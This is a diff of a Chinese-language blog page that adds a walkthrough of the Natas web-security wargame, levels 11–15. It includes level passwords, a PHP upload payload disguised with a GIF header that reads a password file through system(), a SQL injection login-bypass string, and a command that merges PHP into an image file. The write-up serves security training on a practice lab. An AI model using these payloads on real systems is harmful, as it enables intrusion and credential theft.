@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.7k</span>
+            <span class="post-count">2.1k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">7 分钟</span>
+            <span class="post-count">9 分钟</span>
         </span>
     </span>
 </div>
@@ -259,7 +259,44 @@ return $outText;#新值
 
 <p>MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz这就是新cookie了，用bp进行POST时，Cookie换上它。其实也可以f12控制台里document.cookie进行设置</p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516235350410.png" alt="image-20230516235350410"></p>
-<h2 id="NATAS-12-文件上传-待续"><a href="#NATAS-12-文件上传-待续" class="headerlink" title="NATAS 12(文件上传) 待续"></a>NATAS 12(文件上传) 待续</h2> 
+<p>YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/M110K/article/details/112486709?ops_request_misc=%7B%22request_id%22:%22168424913616800182177459%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168424913616800182177459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-112486709-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=natas11&spm=1018.2226.3001.4187">(8WarGame系列之Natas(Web安全)通关指北(中级篇11-20) 详细版_KEY0NE的博客-CSDN博客</a></p>
+<h2 id="NATAS-12-文件上传-任意文件"><a href="#NATAS-12-文件上传-任意文件" class="headerlink" title="NATAS 12(文件上传-任意文件)"></a>NATAS 12(文件上传-任意文件)</h2><p>效果是上传的文件都会被改名，且后缀改为jpg。而文件上传木马只有php时才有效果。</p>
+<p>抓包，改后缀为php</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517111546504.png" alt="image-20230517111546504"></p>
+<p>用蚁剑连接的方式貌似失败诶，那就改成如下内容：</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517112515856.png" alt="image-20230517112515856"></p>
+<p>上传成功后，点击链接就可以</p>
+<p>lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</p>
+<h2 id="NATAS-13-文件上传-仅图像文件"><a href="#NATAS-13-文件上传-仅图像文件" class="headerlink" title="NATAS 13(文件上传-仅图像文件)"></a>NATAS 13(文件上传-仅图像文件)</h2><p>在NATAS 12的基础上，有For security reasons, we now only accept image files!</p>
+<p>改后缀绕过都不行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">else if (! exif_imagetype($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">    echo &quot;File is not an image&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>exif_imagetype()</code> 来验证文件类型，</p>
+<p>那么在文件开头加上GIF98a.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(&#x27;cat /etc/natas_webpass/natas14&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517115603042.png" alt="image-20230517115603042"></p>
+<p>qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</p>
+<h2 id="NATAS-14（登陆页面）"><a href="#NATAS-14（登陆页面）" class="headerlink" title="NATAS 14（登陆页面）"></a>NATAS 14（登陆页面）</h2><p>登陆页面，随便输入账号密码，提交后出现，权限拒绝</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230518140929790.png" alt="image-20230518140929790"></p>
+<p>直接将Sql语句拼接，存在sql注入</p>
+<p><code>username=123&quot; or 1=1#&amp;password=123&quot;</code></p>
+<p>#之后是注释掉了</p>
+<p>原sql语句会变成：</p>
+<p><code>SELECT * from users where username=&quot;123&quot; or 1=1#</code></p>
+<p>即条件始终为真。</p>
+<p>Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</p>
+<h2 id="NATAS-15-输入框提交"><a href="#NATAS-15-输入框提交" class="headerlink" title="NATAS 15 (输入框提交)"></a>NATAS 15 (输入框提交)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysqli_connect(&#x27;localhost&#x27;, &#x27;natas15&#x27;, &#x27;&lt;censored&gt;&#x27;);</span><br><span class="line">    mysqli_select_db($link, &#x27;natas15&#x27;);</span><br><span class="line"></span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($link, $query);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysqli_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        echo &quot;This user exists.&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error in query.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mysqli_query(link,query)在数据库中执行一条sql语句</p>
+<p>link指建立的连接，query查询字符串</p>
+<p>看了wp，说是盲注。</p>
+<p>。。。。。。。。</p>
+<p>它应该会对内容进行检测，试试图片码</p>
+<p><code>copy mm.php/a+a.jpg/b 3.jpg</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517114223870.png" alt="image-20230517114223870"></p>
+ 
       <!-- reward -->
       
     </div>
@@ -336,19 +373,19 @@ return $outText;#新值
    
   <nav class="article-nav">
     
-      <a href="/2023/05/14/bandit-level-0-19/" class="article-nav-link">
+      <a href="/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            bandit(level 0-19)
+            封神台靶场
           
         </div>
       </a>
     
     
-      <a href="/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="article-nav-link">
+      <a href="/2023/05/14/bandit-level-0-19/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">第一篇博客</div>
+        <div class="article-nav-title">bandit(level 0-19)</div>
       </a>
     
   </nav>
@@ -373,7 +410,7 @@ return $outText;#新值
     <ul>
       <li>
         Copyrights &copy;
-        2015-2023
+        2023
         <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
       </li>
     </ul>
@@ -457,10 +494,6 @@ return $outText;#新值
         <i class="ri-search-line"></i>
       </a>
       
-      
-      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
-        <i class="ri-rss-line"></i>
-      </a>
       
     </li>
   </ul>
